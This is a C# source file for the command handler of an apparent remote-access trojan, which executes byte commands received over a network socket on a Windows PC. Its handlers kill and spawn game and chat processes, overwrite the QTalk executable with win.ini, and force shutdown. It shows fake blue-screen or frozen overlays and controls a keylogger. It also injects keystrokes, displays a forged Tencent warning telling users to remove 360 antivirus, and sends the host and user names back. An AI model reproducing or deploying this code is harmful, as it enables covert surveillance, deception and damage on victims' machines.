using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using System.Windows.Media.Imaging;

using System.Runtime.InteropServices; 

namespace MK2_S
{
    class classControl
    {
        public static string lolMain = null;
        Form1 form1;
        Socket clientSocket = null;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern bool LockWorkStation();

        [return: MarshalAs(UnmanagedType.Bool)]
        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern bool BlockInput([In, MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        private Thread formThread = null;

        public classControl(Form1 form1,Socket socket)
        {
            this.form1 = form1;
            clientSocket = socket;
        }

        public static string desUp(string det)
        {
            string des = null;
            string[] list = det.Split('\\');

            int len = list.Length;
            for (int i = 0; i < len - 1; i++)
            {
                des += list[i];
                if (i != len - 2)
                    des += "\\";
            }

            return des;
        }

        public static string desDn(string det, string dn)
        {
            string des = det;
            des += "\\";
            des += dn;

            return des;
        }

        public void form2F(Image image)
        {
            try
            {
                formThread = new Thread(new ParameterizedThreadStart((Object _image) =>
                {
                    try
                    {
                        Image i = image as Image;
                        form1.form2 = new Form2(this);
                        form1.form2.BackgroundImage = i;
                        //Application.Run(form1.form2);
                        form1.form2.ShowDialog();
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                }));
                formThread.IsBackground = true;
                formThread.Start(image);
            }
            catch (Exception e)
            {
                //MessageBox.Show(e.Message);
            }
        }

        public void beControl(byte[] commands)
        {
            switch (commands[0])//programs operation
            {
                case 0x04://Start a process(here are QQ)
                    try
                    {
                        RegistryKey hkml = Registry.CurrentUser.OpenSubKey("HKEY_CURRENT_USER\\Software\\Tencent\\PlatForm_Type_List\\1", true);//true表示可以修改

                        RegistryKey key = Registry.CurrentUser;
                        RegistryKey keytest = key.OpenSubKey("Software\\Tencent\\PlatForm_Type_List\\1", true);

                        string PathValue = keytest.GetValue("TypePath").ToString();

                        Process process = new Process();
                        process.StartInfo.FileName = PathValue;
                        process.Start();

                        //MessageBox.Show(PathValue);
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                case 0x14://Kill a process(LOL)
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "League of Legends")
                            {
                                //lolMain = desUp(desUp(item.MainModule.FileName.ToString()));
                                item.Kill();
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                case 0x15://Kill a process(LOLclient)
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "LolClient")
                            {
                                lolMain = desUp(desUp(item.MainModule.FileName.ToString()));
                                item.Kill();
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                case 0x16://Kill a process(LOL client)
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "Client")
                            {
                                lolMain = desUp(desUp(item.MainModule.FileName.ToString()));
                                item.Kill();
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                case 0x17://RELIVE (LOL)
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "League of Legends")
                            {
                                lolMain = desUp(desUp(item.MainModule.FileName.ToString()));
                                //item.Close();
                            }
                        }
                        Process process = new Process();
                        process.StartInfo.FileName = desDn(lolMain, "Game\\League of Legends.exe");
                        process.Start();
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                case 0x18://RELIVE (LOLclient) 15
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "LolClient")
                            {
                                lolMain = desUp(desUp(item.MainModule.FileName.ToString()));

                                //item.Close();
                            }
                            if (item.ProcessName == "League of Legends")
                            {
                                lolMain = desUp(desUp(item.MainModule.FileName.ToString()));
                                //item.Close();
                            }
                        }
                        for (int i = 0; i < 15; i++)
                        {
                            Process process = new Process();
                            process.StartInfo.FileName = desDn(lolMain, "Air\\LolClient.exe");
                            process.StartInfo.CreateNoWindow = true;
                            process.Start();
                        }

                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                case 0x19://RELIVE (LOL client)
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "Client")
                            {
                                lolMain = desUp(desUp(item.MainModule.FileName.ToString()));
                                //item.Close();
                            }
                            if (item.ProcessName == "League of Legends")
                            {
                                lolMain = desUp(desUp(item.MainModule.FileName.ToString()));
                                //item.Close();
                            }
                        }
                        for (int i = 0; i < 15; i++)
                        {
                            Process process = new Process();
                            process.StartInfo.FileName = desDn(lolMain, "TCLS\\Client.exe");
                            process.StartInfo.CreateNoWindow = true;
                            process.Start();
                        }

                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                default:
                    break;
            }

            switch (commands[1])//exit this
            {
                case 0x04:
                    form1.setReg("keyMk", "2");
                    form1.Close();
                    break;

                default:
                    break;
            }

            switch (commands[2])//system opreation
            {
                case 0x10://shutdown
                    forceTurnoff off = new forceTurnoff();
                    break;

                case 0x11://restart
                    forceTurnoff res = new forceTurnoff(0x01);
                    break;

                case 0x12://hibernate
                    forceTurnoff.hibernate();
                    break;

                case 0x20://turn off back ligt
                    SendMessage(form1.Handle, (uint)0x0112, (IntPtr)0xF170, (IntPtr)2);//Turn off backlight
                    //LockWorkStation();//Lock Screen
                    //BlockInput(true);//Block input(very weak)
                    break;

                case 0x30://BEEP!!!
                    //System.Media.SystemSounds.Asterisk.Play();
                    System.Media.SystemSounds.Hand.Play();
                    break;

                case 0x40://Prevent sleep
                    SystemSleepManagement.PreventSleep();
                    break;

                case 0x41://Restiore sleep
                    SystemSleepManagement.ResotreSleep();
                    break;

                default:
                    break;
            }

            switch (commands[3])//file operation
            {
                case 0x10:

                    try
                    {
                        
                    }
                    catch (Exception ex)
                    {
                        //MessageBox.Show(ex.Message);
                    }

                    break;

                default:
                    break;
            }

            switch (commands[4])//register operation
            {
                case 0x10:

                    try
                    {
                        form1.setReg("keySer", "1");
                    }
                    catch (Exception ex)
                    {
                        //MessageBox.Show(ex.Message);
                    }

                    break;

                default:
                    break;
            }

            switch (commands[5])//explorer
            {
                case 0x10:
                    System.Diagnostics.Process.Start("http://lol.qq.com/"); //LOL Officer page

                    break;

                default:
                    break;
            }

            switch (commands[6])//test
            {
                case 0x10:
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "QTalk" || item.ProcessName == "QT" || item.ProcessName == "broadcasting")
                                try
                                {
                                    item.Kill();

                                    string strAppFileName = System.Environment.GetFolderPath(Environment.SpecialFolder.Windows);
                                    string path = item.MainModule.FileName.ToString();
                                    String sourcePath = strAppFileName + "\\win.ini";
                                    String targetPath = path;
                                    bool isrewrite = true; // true=覆盖已存在的同名文件,false则反之 
                                    try
                                    {
                                        System.IO.File.Copy(sourcePath, targetPath, isrewrite);
                                    }
                                    catch (Exception e)
                                    {

                                    }
                                }
                                catch (Exception e)
                                {
                                    //MessageBox.Show(e.Message);
                                }
                        }
                    }
                    catch (Exception es)
                    {
                    }
                    break;

                case 0x11:
                    try
                    {
                        Process[] ps = Process.GetProcesses();
                        foreach (Process item in ps)
                        {
                            if (item.ProcessName == "QTalk" || item.ProcessName == "QT" || item.ProcessName == "broadcasting")
                            {
                                try
                                {
                                    item.Kill();
                                }
                                catch (Exception e)
                                {
                                    //MessageBox.Show(e.Message);
                                }
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }
                    break;

                default:
                    break;
            }

            switch (commands[7])//System hook
            {
                case 0x10://blue screen
                    try
                    {
                        Thread t = new Thread(new ThreadStart(() =>
                        {
                            try
                            {
                                if(form1.form2 == null)
                                {
                                    adjustVolume.SendMessage(form1.Handle, adjustVolume.WM_APPCOMMAND, 0x200eb0, adjustVolume.APPCOMMAND_VOLUME_MUTE * 0x10000);
                                    form1.form2 = new Form2(this);
                                    form1.form2.WindowState = FormWindowState.Maximized;
                                    form1.form2.ShowDialog();

                                }
                                    
                            }
                            catch (Exception e)
                            {
                                //MessageBox.Show(e.Message);
                            }
                        }));
                        t.IsBackground = true;
                        t.Start();                        
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }

                    break;

                case 0x20://Dummy screen

                    //System.Threading.Thread.Sleep(200);
                    try
                    {
                        Bitmap bit = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics g = Graphics.FromImage(bit);
                        g.CopyFromScreen(new Point(0, 0), new Point(0, 0), bit.Size);

                        bit.Save("akisora.log");
                        bit.Dispose();
                        Image i = Image.FromFile(@"akisora.log");                        

                        //form2F(i);
                        Thread t = new Thread(new ThreadStart(() =>
                        {
                            if (form1.form2 == null)
                            {
                                adjustVolume.SendMessage(form1.Handle, adjustVolume.WM_APPCOMMAND, 0x200eb0, adjustVolume.APPCOMMAND_VOLUME_MUTE * 0x10000);

                                form1.form2 = new Form2(this);

                                form1.form2.cleanLab();

                                form1.form2.BackgroundImage = i;//Image.FromStream
                                form1.form2.WindowState = FormWindowState.Maximized;
                                form1.form2.ShowDialog();
                            }
       
                        }));
                        t.IsBackground = true;
                        t.Start();

                        //i.Dispose();
                        g.Dispose();
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }

                    break;

                case 0x21://Dummy screen full volume

                    //System.Threading.Thread.Sleep(200);
                    try
                    {
                        Bitmap bit = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        Graphics g = Graphics.FromImage(bit);
                        g.CopyFromScreen(new Point(0, 0), new Point(0, 0), bit.Size);

                        bit.Save("akisora.log");

                        Image i = Image.FromFile(@"akisora.log");                        

                        //form2F(i);
                        Thread t = new Thread(new ThreadStart(() =>
                        {
                            if (form1.form2 == null)
                            {
                                for (int j = 0; j < 50; j++)
                                    adjustVolume.SendMessage(form1.Handle, adjustVolume.WM_APPCOMMAND, 0x30292, adjustVolume.APPCOMMAND_VOLUME_UP * 0x10000);

                                form1.form2 = new Form2(this);

                                form1.form2.cleanLab();
                                form1.form2.BackgroundImage = i;//Image.FromStream
                                form1.form2.WindowState = FormWindowState.Maximized;
                                form1.form2.ShowDialog();
                            }

                        }));
                        t.IsBackground = true;
                        t.Start();

                        //i.Dispose();
                        g.Dispose();
                        //File.Delete(@"screenShot.bmp");
                    }
                    catch (Exception e) 
                    {
                        //MessageBox.Show(e.Message);
                    }

                    break;

                case 0x30://release screen
                    try
                    {
                        if(form1.form2 != null)
                        {
                            form1.form2.Close();
                            form1.form2 = null;
                            //adjustVolume.SendMessage(form1.Handle, adjustVolume.WM_APPCOMMAND, 0x200eb0, adjustVolume.APPCOMMAND_VOLUME_MUTE * 0x10000);

                        }
                        //File.Delete(@"screenShot.bmp");
                    }
                    catch(Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }

                    break;

                case 0x40://initSpykey
                    //form1.keyspy = new keySpy();
                    //form1.keyspy.startSpy();

                    break;

                case 0x41://Spykey buile log
                    form1.keyspy.buildLog();

                    break;

                case 0x42://Stop Spykey
                    form1.keyspy.stopSpy();

                    break;


                default:
                    break;
            }

            if (commands[8] >= 0x60 && commands[8] <= 0x8f)
            {
                byte command = commands[8];

                if (commands[8] >= 0x60 && commands[8] <= 0x6f)//num
                {
                    command &= 0x0f;
                    adjustVolume.numKey(command);
                }

                if (commands[8] >= 0x70 && commands[8] <= 0x8f)//alp
                {
                    if (commands[8] >= 0x70 && commands[8] <= 0x7f)//alp
                    {
                        command &= 0x0f;
                        adjustVolume.alpKey(command);
                    }
                    else
                        command &= 0x0f;
                        adjustVolume.alpKey(command + 12);
                }

                if (commands[8] >= 0x90 && commands[8] <= 0x9f)//fun
                {
                    command &= 0x0f;
                    adjustVolume.funKey(command);
                }
            }
                
            switch (commands[8])//Parlo function
            {
                case 0x10:
                    adjustVolume.SendMessage(form1.Handle, adjustVolume.WM_APPCOMMAND, 0x30292, adjustVolume.APPCOMMAND_VOLUME_UP * 0x10000);
                    break;

                case 0x11:
                    adjustVolume.SendMessage(form1.Handle, adjustVolume.WM_APPCOMMAND, 0x30292, adjustVolume.APPCOMMAND_VOLUME_DOWN * 0x10000);
                    break;

                case 0x12:
                    adjustVolume.SendMessage(form1.Handle, adjustVolume.WM_APPCOMMAND, 0x30292, adjustVolume.APPCOMMAND_VOLUME_MUTE * 0x10000);
                    break;

                case 0x20:
                    adjustVolume.Play();
                    break;

                case 0x21:
                    adjustVolume.Stop();
                    break;

                case 0x22:
                    adjustVolume.Previous();
                    break;

                case 0x23:
                    adjustVolume.Next();
                    break;

                case 0x50:
                    adjustVolume.altF4();
                    break;

                case 0x51:
                    adjustVolume.winD();
                    break;

                case 0x52:
                    adjustVolume.altTab();
                    break;

                case 0x53:
                    adjustVolume.esc();
                    break;

                case 0x54:
                    adjustVolume.win();
                    break;

                case 0x55:
                    adjustVolume.spaceBar();
                    break;

                case 0x56:
                    adjustVolume.enter();
                    break;

                case 0x57:
                    adjustVolume.backSpace();
                    break;

                case 0x58:
                    adjustVolume.delete();
                    break;

                case 0x59:
                    adjustVolume.numLock();
                    break;

                case 0x5a:
                    adjustVolume.arrUp();
                    break;
                case 0x5b:
                    adjustVolume.arrDown();
                    break;
                case 0x5c:
                    adjustVolume.arrLeft();
                    break;
                case 0x5d:
                    adjustVolume.arrRight();
                    break;

                case 0x5e:
                    adjustVolume.mouLeft();
                    break;
                case 0x5f:
                    adjustVolume.mouRight();
                    break;

                    //0x60 - 0x9f

                default:
                    break;
            }

            switch (commands[9])//Second Pipe
            {
                case 0x10:

                    try
                    {
                        Thread t = new Thread(new ThreadStart(() =>
                        {
                            try
                            {
                                MessageBox.Show("腾讯游戏后台升级及维护模块，以及宣传模块受到疑似360安全卫士的攻击，请卸载360。\r\n为您带来不便我们深感抱歉！");
                            }
                            catch (Exception e)
                            {
                                //MessageBox.Show(e.Message);
                            }
                        }));
                        t.IsBackground = true;
                        t.Start();
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message);
                    }

                    break;

                default:
                    break;
            }

            switch (commands[10])//get information
            {
                case 0x10://GET PC NAME
                Thread t = new Thread(new ThreadStart(() =>
                {
                    try
                    {
                        //MessageBox.Show("GET NAME");
                        byte[] head = new byte[7];//0.sort of data 1 - 2.count of packets 3 - 4.current index 5 - 6. the size of last packet 7.data start here! // MAX SIZE 62MB!!!
                        byte[] name = Encoding.Unicode.GetBytes(Environment.MachineName);
                        head[0] = 0x01;//HOST NAME
                        form1.fillArray(1, head, 1, 2);
                        form1.fillArray(0, head, 3, 2);////////////////
                        form1.fillArray(name.Length, head, 5, 2);
                        byte[] data = new byte[head.Length + name.Length];
                        head.CopyTo(data, 0);
                        name.CopyTo(data, head.Length);

                        clientSocket.Send(data);
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message + "\r\nFrom: " + this);
                    }
                }));
                t.IsBackground = true;
                t.Start();     

                break;

                case 0x11://GET USER NAME
                Thread tN = new Thread(new ThreadStart(() =>
                {
                    try
                    {                        
                        byte[] head = new byte[7];//0.sort of data 1 - 2.count of packets 3 - 4.current index 5 - 6. the size of last packet 7.data start here! // MAX SIZE 62MB!!!
                        byte[] name = Encoding.UTF8.GetBytes(Environment.UserName);
                        //MessageBox.Show("GET USER");
                        head[0] = 0x01;//HOST NAME
                        form1.fillArray(1, head, 1, 2);
                        form1.fillArray(0, head, 3, 2);////////////////
                        form1.fillArray(name.Length, head, 5, 2);
                        byte[] data = new byte[head.Length + name.Length];
                        head.CopyTo(data, 0);
                        name.CopyTo(data, head.Length);

                        clientSocket.Send(data);
                    }
                    catch (Exception e)
                    {
                        //MessageBox.Show(e.Message + "\r\nFrom: " + this);
                    }
                }));
                tN.IsBackground = true;
                tN.Start();

                break;

                default:
                    break;
            }

            switch (commands[11])//Transmit File //11 for command 12 - 15 for size(bit) 16 - 19 for packet count 20-23 size of packet 24-27 size of last packet 27 - 36 keep for future use  
            {
                case 0x10://Prepare to receive file

                    int offset = 12;
                    int size_file = 0;
                    int count_packet = 0;
                    int size_packet = 0;
                    int size_last_packet = 0;                    

                    size_file = (int)(((commands[offset] & 0xFF) << 24)
                    | ((commands[offset + 1] & 0xFF) << 16)
                    | ((commands[offset + 2] & 0xFF) << 8)
                    | (commands[offset + 3] & 0xFF));

                    offset += 4;
                    count_packet = (int)(((commands[offset] & 0xFF) << 24)
                    | ((commands[offset + 1] & 0xFF) << 16)
                    | ((commands[offset + 2] & 0xFF) << 8)
                    | (commands[offset + 3] & 0xFF));           
  
                    offset += 4;
                    size_packet = (int)(((commands[offset] & 0xFF) << 24)
                    | ((commands[offset + 1] & 0xFF) << 16)
                    | ((commands[offset + 2] & 0xFF) << 8)
                    | (commands[offset + 3] & 0xFF));   

                    offset += 4;
                    size_last_packet = (int)(((commands[offset] & 0xFF) << 24)
                    | ((commands[offset + 1] & 0xFF) << 16)
                    | ((commands[offset + 2] & 0xFF) << 8)
                    | (commands[offset + 3] & 0xFF));

                    //MessageBox.Show("size_file : " + size_file.ToString() + "\r\n" +
                    //                "count_packet : " + count_packet.ToString() + "\r\n" +
                    //                "size_packet : " + size_packet.ToString() + "\r\n" +
                    //                "size_last_packet : " + size_last_packet.ToString() + "\r\n");

                    TransmitFile transmitfile = new TransmitFile();
                    //transmitfile.ReceiveFile(size_file, count_packet, size_packet, size_last_packet);

                    break;

                default:
                    break;
            }

        }
    }
}
